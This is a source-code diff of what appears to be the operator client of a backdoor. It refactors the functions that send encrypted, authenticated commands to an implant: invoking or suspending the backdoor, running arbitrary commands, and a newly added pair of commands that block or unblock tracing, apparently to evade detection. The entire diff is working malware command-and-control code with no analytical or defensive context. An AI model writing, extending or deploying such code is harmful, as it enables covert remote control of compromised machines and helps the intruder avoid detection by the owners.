@@ -3,13 +3,42 @@
 static char *line = NULL;
 static unsigned long message_id = 0;
 
-static void toggle_backdoor(unsigned long message_id, int command_type)
+static int send_empty_command(unsigned long message_id, int command_type)
 {
   unsigned char message[MESSAGE_BUF_SIZE], buf[24];
+  int res;
 
   generate_rand_string(buf, 24);
   craft_message(message, AUTH_HEADER, message_id, command_type, 24, buf, buf);
-  send_request(message);
+
+  res = send_request(message);
+  return res;
+}
+
+static int send_command(unsigned long message_id, int command_type, unsigned char *payload, size_t payload_len)
+{
+  int ciphertext_len, res;
+  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
+  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
+  unsigned char message[MESSAGE_BUF_SIZE];
+
+  randombytes_buf(nonce, sizeof(nonce));
+  if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)payload, payload_len, nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
+  {
+    log_error("encrypt");
+    return -1;
+  }
+
+  to_hex(ciphertext, ciphertext_len, ciphertext_hex);
+  to_hex(nonce, sizeof(nonce), nonce_hex);
+  if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
+  {
+    log_error("craft_message");
+    return -1;
+  }
+
+  res = send_request(message);
+  return res;
 }
 
 static void cleanup()
@@ -117,10 +146,7 @@ int main()
 {
   ssize_t n;
   size_t len = 0;
-  int ciphertext_len, command_type, i, dl_port;
-  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
-  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
-  unsigned char message[MESSAGE_BUF_SIZE];
+  int command_type, i, dl_port;
   char buf[BUF_SIZE];
   pthread_t thread_id;
 
@@ -128,7 +154,7 @@ int main()
 
   signal(SIGINT, cleanup);
 
-  toggle_backdoor(message_id, TYPE_INVOKE_BACKDOOR);
+  send_empty_command(message_id, TYPE_INVOKE_BACKDOOR);
   message_id++;
 
   dl_port = LISTEN_PORT;
@@ -150,28 +176,23 @@ int main()
     snprintf(buf, sizeof(buf), "%.*s", i, line);
     command_type = get_command_type(buf);
 
-    if (command_type == TYPE_INVOKE_BACKDOOR || command_type == TYPE_SUSPEND_BACKDOOR)
+    if (command_type == TYPE_INVOKE_BACKDOOR || command_type == TYPE_SUSPEND_BACKDOOR
+      || command_type == TYPE_BLOCK_TRACE || command_type == TYPE_UNBLOCK_TRACE
+    )
     {
-      toggle_backdoor(message_id, command_type);
+      if (send_empty_command(message_id, command_type) < 0)
+      {
+        log_error("send_empty_command");
+        continue;
+      }
     }
-    else // TYPE_EXECUTE_CMD
+    else
     {
-      randombytes_buf(nonce, sizeof(nonce));
-      if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)line, len, nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
+      if (send_command(message_id, command_type, (unsigned char *)line, len) < 0)
       {
-        log_error("encrypt");
+        log_error("send_command");
         continue;
       }
-
-      to_hex(ciphertext, ciphertext_len, ciphertext_hex);
-      to_hex(nonce, sizeof(nonce), nonce_hex);
-      if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
-      {
-        log_error("craft_message");
-        continue;
-      }
-
-      send_request(message);
     }
 
     message_id++;
